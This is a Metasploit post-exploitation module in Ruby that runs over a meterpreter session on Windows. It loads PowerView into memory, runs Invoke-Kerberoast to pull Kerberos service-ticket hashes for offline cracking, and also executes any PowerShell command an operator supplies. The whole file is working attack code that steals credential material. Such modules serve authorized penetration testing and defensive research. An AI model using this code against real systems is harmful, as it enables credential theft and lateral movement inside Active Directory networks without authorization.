##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::Priv
  include Msf::Post::Common

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Kerberoast',
      'Description' => %q(This module load into memory PowerView.ps1 and executes Invoke-Kerberoast.),
      'License' => MSF_LICENSE,
      'Author' => [
        'harmj0y', # Invoke-Kerberoast
        'phra' # MSF Module
      ],
      'References' => ['https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1'],
      'Platform' => [ 'win' ],
      'Arch' => [ 'x86', 'x64' ],
      'SessionTypes' => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('CMD', [ true, 'Example: Invoke-Kerberoast | fl', 'Get-Help Invoke-Kerberoast' ])
      ],
      self.class
    )
  end

  def run
    if have_powershell?
      vprint_good('PowerShell is installed.')
    else
      print_error('PowerShell is not installed! STOPPING')
      return
    end

    client.core.use "powershell"

    print_status("Importing: PowerView")

    opts = {
      file: File.expand_path(File.join(Msf::Config.data_directory, "post", "powershell", "PowerView.ps1"))
    }

    client.powershell.import_file(opts)
    print_good("Imported: PowerView")
    print_status("Executing: #{datastore['CMD']}")

    opts = {
      code: datastore['CMD']
    }

    result = client.powershell.execute_string(opts)
    print_good("Command execution completed:\n#{result}")
  end
end
